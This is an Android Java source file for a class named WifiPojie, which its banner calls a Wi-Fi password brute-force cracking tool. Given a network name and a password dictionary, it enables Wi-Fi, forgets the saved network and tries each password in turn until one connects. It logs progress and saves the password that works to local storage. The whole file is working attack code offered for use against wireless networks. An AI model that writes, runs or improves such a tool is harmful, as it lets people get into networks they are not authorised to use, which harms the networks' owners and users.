package wifi.pojie;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class WifiPojie {

    private final String ssid;
    private final String[] dictionary;
    private final int timeoutMillis;
    private final Consumer<String> logOutputFunction;
    private final TriConsumer<Integer, Integer, String> progressFunction;
    private final Runnable endFunc;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private ConnectWifi connectWifi;
    private boolean isDestroyed = false;
    private int currentTryIndex;
    private final Context context;

    /**
     * 构造函数
     *
     * @param config            运行参数
     * @param settings          设置内容
     * @param logOutputFunction 输出日志函数
     * @param progressFunction  设置进度函数(当前进度数字,总进度数字,进度信息文本)
     * @param endFunc           任务结束时执行的函数
     */
    public WifiPojie(Context context,
                     Map<String, ?> config,
                     Map<String, ?> settings,
                     Consumer<String> logOutputFunction,
                     TriConsumer<Integer, Integer, String> progressFunction,
                     Runnable endFunc) throws ExecutionException, InterruptedException {


        this.context = context;
        this.ssid = (String) config.get("ssid");
        this.dictionary = (String[]) config.get("dictionary");
        this.timeoutMillis = (int) config.get("timeoutMillis");
        this.logOutputFunction = logOutputFunction;
        this.progressFunction = progressFunction;
        this.endFunc = endFunc;
        this.currentTryIndex = (int) config.get("startLine") - 1;

        // 在后台线程启动破解过程
        logOutputFunction.accept("      _      __                 _        \n" +
                "     | |___ / _|_ __ ___  _   _| |_ __ _ \n" +
                "  _  | / __| |_| '_ ` _ \\| | | | __/ _` |\n" +
                " | |_| \\__ \\  _| | | | | | |_| | || (_| |\n" +
                "  \\___/|___/_| |_| |_| |_|\\__, |\\__\\__, |\n" +
                "                          |___/    |___/ \n" +
                "==========================================");
        logOutputFunction.accept("wifi密码暴力破解工具v2 for Android");

        try {
            connectWifi = new ConnectWifi(context, settings, config);

            if (!connectWifi.wifiIsEnabled()) {
                logOutputFunction.accept("wifi已关闭，正在打开wifi...");

                int turnonMode = (int) settings.get(SettingsManager.KEY_TURNON_MODE);

                if (turnonMode == 0) {
                    connectWifi.wifiManager.setWifiEnabled(true);
                    logOutputFunction.accept("请在打开WiFi后重新点击开始运行");
                    destroy(false);
                    return;
                } else if (turnonMode == 1)
                    ConnectWifi.runCommand("cmd wifi set-wifi-enabled enabled", (int) settings.get(SettingsManager.KEY_TURNON_MODE_CMD));
            }

            int netId = connectWifi.getWifiId(ssid);
            if (netId != -1) {
                connectWifi.forgetWifiName(ssid);
                logOutputFunction.accept("当前wifi已经保存，已自动忘记该网络");
            }


            assert dictionary != null;
            logOutputFunction.accept("开始运行 SSID:" + ssid + " 密码总数:" + dictionary.length + "\n");

            executorService.submit(this::startCrackingProcess);
        } catch (RuntimeException e) {
            logOutputFunction.accept("E: " + e);
            destroy(false);
        }
    }

    @SuppressLint("DefaultLocale")
    private void startCrackingProcess() {
        // 检查是否已被销毁
        if (isDestroyed || currentTryIndex >= dictionary.length) {
            if (currentTryIndex >= dictionary.length) {
                logOutputFunction.accept("所有密码尝试完毕，连接失败！");
            }
            destroy(true);
            return;
        }

        try {
            // 更新进度
            if (progressFunction != null) {
                progressFunction.accept(
                        currentTryIndex + 1,
                        dictionary.length,
                        String.format("%.1f", ((double) currentTryIndex * 100 / dictionary.length)) + "% [" + (currentTryIndex + 1) + "/" + dictionary.length + "] 正在尝试：" + dictionary[currentTryIndex]
                );
            }

            // 记录尝试
            logAttempt(ssid, currentTryIndex + 1, null);

            // 尝试连接
            connectWifi.connect(String.valueOf(ssid), dictionary[currentTryIndex], timeoutMillis, (result) -> {
                // 确保回调在非销毁状态下执行
                if (isDestroyed) {
                    return;
                }
                logOutputFunction.accept(
                        "密码:" + dictionary[currentTryIndex] +
                                " 结果:" + result
                );

                if (Objects.equals(result, "success")) {
                    // 成功连接
                    logOutputFunction.accept("成功连接到WiFi网络: " + ssid + " 密码: " + dictionary[currentTryIndex]);
                    logAttempt(ssid, currentTryIndex + 1, dictionary[currentTryIndex]);
                    destroy(false);
                } else {
                    connectWifi.forgetWifiName(ssid);
                    currentTryIndex++;
                    executorService.submit(this::startCrackingProcess);
                }
            });
        } catch (Exception e) {
            logOutputFunction.accept("E: " + e.getMessage());
            destroy(false);
        }
    }

    /**
     * 记录尝试数据到 SharedPreferences，并输出日志确认
     * 逻辑：
     * 1. 如果已存在该ssid，则尝试次数+1，若本次密码正确则更新密码。
     * 2. 如果不存在则新建。
     */
    private void logAttempt(String ssid, int attemptCount, String correctPassword) {
        Log.i("WifiPojie", "开始记录尝试数据: SSID=" + ssid + ", 尝试次数=" + attemptCount);

        SharedPreferences sharedPreferences = context.getSharedPreferences("wifi_attempts", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        // 获取现有记录
        String existingData = sharedPreferences.getString("attempts", "[]");
        JSONArray attemptsArray;
        try {
            attemptsArray = new JSONArray(existingData);
        } catch (JSONException e) {
            Log.e("WifiPojie", "解析现有记录时出错", e);
            attemptsArray = new JSONArray();
        }

        boolean found = false;
        for (int i = 0; i < attemptsArray.length(); i++) {
            try {
                JSONObject obj = attemptsArray.getJSONObject(i);
                if (obj.getString("ssid").equals(ssid)) {
                    // 已存在该ssid，尝试次数+1
                    int oldCount = obj.optInt("attemptCount", 0);
                    obj.put("attemptCount", oldCount + 1);
                    // 如果本次密码正确，更新密码
                    if (correctPassword != null && !"N/A".equals(correctPassword)) {
                        obj.put("correctPassword", correctPassword);
                    }
                    found = true;
                    break;
                }
            } catch (JSONException e) {
                Log.e("WifiPojie", "遍历记录时出错", e);
            }
        }
        if (!found) {
            // 新建记录
            JSONObject attemptObject = new JSONObject();
            try {
                attemptObject.put("ssid", ssid);
                attemptObject.put("attemptCount", 1);
                attemptObject.put("correctPassword", correctPassword != null ? correctPassword : "N/A");
                attemptsArray.put(attemptObject);
            } catch (JSONException e) {
                Log.e("WifiPojie", "创建新记录对象时出错", e);
            }
        }
        // 保存更新后的记录
        editor.putString("attempts", attemptsArray.toString());
        editor.apply();
        Log.i("WifiPojie", "记录已保存: SSID=" + ssid + ", 尝试次数=" + attemptCount + ", 密码=" + (correctPassword != null ? correctPassword : "N/A"));
    }

    public void destroy(boolean byUser) {
        if (isDestroyed) return;
        try {
            if (byUser) {
                connectWifi.forgetWifiName(ssid);
                logOutputFunction.accept("已自动忘记没有连接成功的wifi");
            }
        } catch (RuntimeException e) {
            logOutputFunction.accept(e.toString());
        }
        isDestroyed = true;
        if (connectWifi != null) connectWifi.destroy();
        executorService.shutdownNow();
        if (logOutputFunction != null) {
            logOutputFunction.accept("==运行结束==");
        }

        if (endFunc != null) {
            endFunc.run();
        }
    }

    public void shutdownExecutorService() {
        executorService.shutdownNow();
    }

    @FunctionalInterface
    public interface TriConsumer<T, U, V> {
        void accept(T t, U u, V v);
    }
}